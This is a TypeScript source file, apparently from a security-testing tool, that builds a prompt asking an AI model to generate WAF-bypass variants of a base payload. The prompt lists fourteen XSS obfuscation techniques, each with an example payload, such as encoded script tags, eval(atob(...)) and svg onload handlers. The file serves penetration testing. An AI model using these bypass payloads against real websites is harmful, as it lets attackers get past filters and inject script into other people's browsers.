// services/prompts/payloadForge.ts

/**
 * Creates the prompt for the Payload Forge feature.
 * @param basePayload The initial payload to be transformed.
 * @returns The complete prompt string.
 */
export const createPayloadForgePrompt = (basePayload: string): string => `
    Act as a world-class penetration tester and WAF bypass expert.
    Given the following base security payload, your task is to generate a diverse list of variations using advanced obfuscation and encoding techniques to test for WAF bypasses.

    Base Payload: \`${basePayload}\`

    You must generate at least one payload for each of the following techniques. For each generated payload, you must identify the primary technique used and provide a brief description of how it works.

    **Mandatory WAF Bypass Techniques to Generate:**
    1.  **URL Encoding:** e.g., <s%63ript>alert(1)</s%63ript>
    2.  **HTML Entity Encoding (Hex):** e.g., <s&#x63;ript>alert(1)</s&#x63;ript>
    3.  **Case Variation:** e.g., <ScRiPt>alert(1)</ScRipT>
    4.  **HTML Comments:** e.g., <scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
    5.  **Whitespace Manipulation:** Use tabs, newlines, etc. e.g., <scr\\t\\n\\ript>alert(1)</scr\\t\\n\\ript>
    6.  **JavaScript String Concatenation:** e.g., <script>eval('al'+'ert(1)')</script>
    7.  **JavaScript fromCharCode:** e.g., <script>alert(String.fromCharCode(49))</script>
    8.  **Base64 Encoding (atob):** e.g., <script>eval(atob('YWxlcnQoMSk='))</script>
    9.  **Alternative HTML Tag (svg/onload):** e.g., <svg onload=alert(1)>
    10. **Alternative HTML Tag (details/ontoggle):** e.g., <details open ontoggle=alert(1)>
    11. **Polymorphic Variant (confirm):** Replace alert() with confirm().
    12. **Polymorphic Variant (prompt):** Replace alert() with prompt().
    13. **Null Byte Insertion:** e.g., <scr\\u0000ipt>alert(1)</scr\\u0000ipt>
    14. **JavaScript Template Literals:** e.g., <script>alert(\`1\`)<\/script>

    **Output Format:**
    Return a single, valid JSON object. This object must have a single key, "payloads", which is an array of objects.
    Each object in the "payloads" array must have exactly three keys:
    1.  "technique": A short string naming the primary technique from the list above (e.g., "URL Encoding", "Case Variation").
    2.  "description": A brief, one-sentence explanation of how this specific variation works and why it might bypass a WAF.
    3.  "payload": The generated, obfuscated payload string. CRITICAL: This string must be a single, continuous line of text and must NOT contain any newline (\\n) or tab (\\t) characters.

    IMPORTANT: The entire response must be ONLY the JSON object, starting with '{' and ending with '}'.
    Ensure all string values inside the JSON, especially the 'payload', are properly escaped for JSON validity.
    Generate a creative and effective payload for each technique.
`;